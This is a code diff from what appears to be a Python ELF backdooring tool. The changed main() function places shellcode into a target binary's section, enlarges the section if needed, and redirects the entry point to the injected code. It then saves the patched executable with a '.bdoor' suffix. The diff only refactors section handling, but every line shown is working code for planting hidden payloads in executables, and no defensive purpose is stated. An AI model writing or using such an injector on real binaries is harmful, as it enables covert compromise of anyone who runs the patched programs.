@@ -69,34 +69,33 @@ def main():
     legit_loc  = elf.e_entry
     sc = gen_sc_wrapper(elf.p(legit_loc), elf.p(loc+5), shellcode)
 
-    section     = elf.get_section_from_offset(loc)
-    end_section = elf.get_section_from_offset(loc+len(sc))
+    secid     = elf.get_section_id_from_offset(loc)
+    end_secid = elf.get_section_id_from_offset(loc+len(sc))
 
-    if not section:
+    if not secid:
         print("[x] Error, location is outside of a section.")
         return
 
-    elif not end_section:
-        print(f"[!] Section {section.sh_name_str} is finishing before the end of the shellcode.")
+    elif not end_secid:
+        print(f"[!] Section {elf.section_headers[secid].sh_name_str} is finishing before the end of the shellcode.")
         resp = input(f"[?] Should we increase its size? [Y/n] ")
         if resp.lower() != 'y':
             print("[!] Exiting...")
             return
 
-        print(f"[*] Previous size: {section.sh_size} Bytes")
-        section.sh_size = section.sh_size + len(sc)
-        print(f"[*] New size: {section.sh_size} Bytes")
+        print(f"[*] Previous size: {elf.section_headers[secid].sh_size} Bytes")
+        elf.section_headers[secid].sh_size = elf.section_headers[secid].sh_size + len(sc)
+        print(f"[*] New size: {elf.section_headers[secid].sh_size} Bytes")
 
-    elif section.sh_name != end_section.sh_name:
+    elif elf.section_headers[secid].sh_name != elf.section_headers[end_secid].sh_name:
         print("[x] Error! The shellcode is overlapping 2 sections. Find another place.")
-        return
-
-        section.print_section_header()
-        end_section.print_section_header()
+        elf.section_headers[secid].print_section_header()
+        elf.section_headers[end_secid].print_section_header()
         return
 
     elf.e_entry = loc
     elf.elf_file[loc:loc+len(sc)] = sc
+
     newBinData = elf.build_elf()
 
     with open(f"./{args.binary.split('/')[-1]}.bdoor", "wb") as f:
